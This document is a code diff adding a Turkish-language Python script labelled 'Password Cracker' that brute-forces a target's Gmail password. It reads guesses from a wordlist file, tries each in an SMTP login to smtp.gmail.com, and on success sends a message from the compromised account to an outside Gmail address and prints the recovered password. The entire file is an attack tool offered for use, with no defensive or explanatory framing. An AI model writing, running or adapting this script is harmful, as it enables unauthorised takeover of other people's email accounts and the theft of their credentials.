@@ -1,0 +1,63 @@
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime. text import MIMEText
+import sys
+import os
+
+print("""\033[0;32m\
+	************************
+	    Şifre Kırıcı
+	************************
+""")
+
+mesaj = MIMEMultipart()
+
+E_posta = input("Şifresi kırılacak E-posta'yı girin: ")
+
+mesaj["From"] = E_posta
+
+mesaj["To"] = "hack.dene018@gmail.com"
+
+mesaj["Subject"] = "aa"
+
+mesaj_içeriği = "aa"
+
+mesaj_gövdesi = MIMEText(mesaj_içeriği,"plain")
+
+mesaj.attach(mesaj_gövdesi)
+
+
+mail = smtplib.SMTP("smtp.gmail.com",587)
+
+mail.ehlo()
+
+mail.starttls()
+
+with open("worldlist.txt", "r", encoding= "utf-8") as i:
+	kelime = i.readlines()
+
+deneme_sayısı = 1
+
+for i in kelime:
+	deneme_sayısı = deneme_sayısı + 1
+	try:
+		mail.login(E_posta,i)
+		break
+	except:
+		os.system("clear")
+		print("""
+	************************
+	    Şifre Kırıcı
+	************************
+""")
+		print("Şifre Kırma Denemesi:",  deneme_sayısı)
+		pass
+try:
+	mail.sendmail(mesaj["From"],		mesaj["To"],mesaj.as_string())
+	print("Şifre Başarıyla Kırıldı...\n")
+	print("Şifre:\033[41m", i, "\033[0m")
+except:
+	print("Hesap Şifresi WordList'e dehil değil.\n")
+
+print("\033[0;96m@Mert-Studio")
+mail.close()
